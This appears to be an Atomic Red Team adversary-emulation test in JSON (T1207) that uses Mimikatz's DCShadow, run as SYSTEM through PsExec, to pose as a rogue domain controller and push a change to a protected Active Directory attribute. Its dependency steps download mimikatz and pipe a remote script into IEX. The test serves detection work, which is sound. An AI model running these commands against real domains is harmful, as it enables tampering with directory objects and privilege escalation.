{
  "id": "0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6",
  "name": "DCShadow (Active Directory)",
  "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=\u003cuser\u003e)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "72979d84-cf6a-4356-8008-e8118791e67a",
      "type": "execute-command",
      "data": {
        "command": "# starting fake DC server, as SYSTEM (required)\n$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"\nRemove-Item $dc_output_file -ErrorAction Ignore\n$mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"\n$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"\n\n# wait for fake DC server to be ready...\nStart-Sleep -Seconds 5\n\n# server ready, so trigger replication (push) and wait until it finished\n\u0026 \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"\n\nWrite-Host \"`nWaiting for fake DC server to return\"\nWait-Process $dc\n\nWrite-Host \"`nOutput from fake DC server:\"\nGet-Content $dc_output_file\nStart-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it\nRemove-Item $dc_output_file -ErrorAction Ignore\n\nWrite-Host \"End of DCShadow\"\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "5c24bf9c-c28f-443e-bbc7-1608b4990711",
      "type": "execute-command",
      "data": {
        "command": "Stop-Process -Name \"mimikatz\" -Force -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "5310cece-c7c1-4f2c-8ca1-b95cbc178573",
      "name": "Check dependency 1/2",
      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
      "type": "execute-command",
      "data": {
        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "55f02258-fd79-47db-9e6a-098b5a42582f",
      "name": "Resolve dependency 1/2",
      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "abcff1ec-68da-4aa7-8ea8-d20639e636ca",
      "name": "Re-check dependency 1/2",
      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
      "type": "execute-command",
      "data": {
        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d8682a86-3c8f-4751-b0d3-4d01e7faac41",
      "name": "Check dependency 2/2",
      "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "7d2dfe08-1dbb-4234-ad97-d3c4ecde4771",
      "name": "Resolve dependency 2/2",
      "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "ab29d1ec-97c7-47d6-852e-3a2fdb38e715",
      "name": "Re-check dependency 2/2",
      "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "72979d84-cf6a-4356-8008-e8118791e67a",
      "p": "on-success",
      "o": "5c24bf9c-c28f-443e-bbc7-1608b4990711"
    },
    {
      "s": "72979d84-cf6a-4356-8008-e8118791e67a",
      "p": "on-failure",
      "o": "5c24bf9c-c28f-443e-bbc7-1608b4990711"
    },
    {
      "s": "5310cece-c7c1-4f2c-8ca1-b95cbc178573",
      "p": "on-success",
      "o": "72979d84-cf6a-4356-8008-e8118791e67a"
    },
    {
      "s": "5310cece-c7c1-4f2c-8ca1-b95cbc178573",
      "p": "on-failure",
      "o": "55f02258-fd79-47db-9e6a-098b5a42582f"
    },
    {
      "s": "55f02258-fd79-47db-9e6a-098b5a42582f",
      "p": "on-success",
      "o": "abcff1ec-68da-4aa7-8ea8-d20639e636ca"
    },
    {
      "s": "abcff1ec-68da-4aa7-8ea8-d20639e636ca",
      "p": "on-failure",
      "o": "72979d84-cf6a-4356-8008-e8118791e67a"
    },
    {
      "s": "d8682a86-3c8f-4751-b0d3-4d01e7faac41",
      "p": "on-success",
      "o": "72979d84-cf6a-4356-8008-e8118791e67a"
    },
    {
      "s": "d8682a86-3c8f-4751-b0d3-4d01e7faac41",
      "p": "on-failure",
      "o": "7d2dfe08-1dbb-4234-ad97-d3c4ecde4771"
    },
    {
      "s": "7d2dfe08-1dbb-4234-ad97-d3c4ecde4771",
      "p": "on-success",
      "o": "ab29d1ec-97c7-47d6-852e-3a2fdb38e715"
    },
    {
      "s": "ab29d1ec-97c7-47d6-852e-3a2fdb38e715",
      "p": "on-failure",
      "o": "72979d84-cf6a-4356-8008-e8118791e67a"
    }
  ],
  "tags": [
    "T1207",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "object",
      "type": "string",
      "description": "Targeted object (for machine account do not forget to add final '$')",
      "value": "bruce.wayne"
    },
    {
      "name": "attribute",
      "type": "string",
      "description": "Object attribute to edit, interesting ones: badpwdcount, primaryGroupId, SIDHistory...",
      "value": "badpwdcount"
    },
    {
      "name": "value",
      "type": "string",
      "description": "Value to assign to object attribute",
      "value": "9999"
    },
    {
      "name": "mimikatz_path",
      "type": "path",
      "description": "Mimikatz windows executable",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
    },
    {
      "name": "psexec_path",
      "type": "path",
      "description": "Path to PsExec",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\PSTools\\PsExec.exe"
    }
  ]
}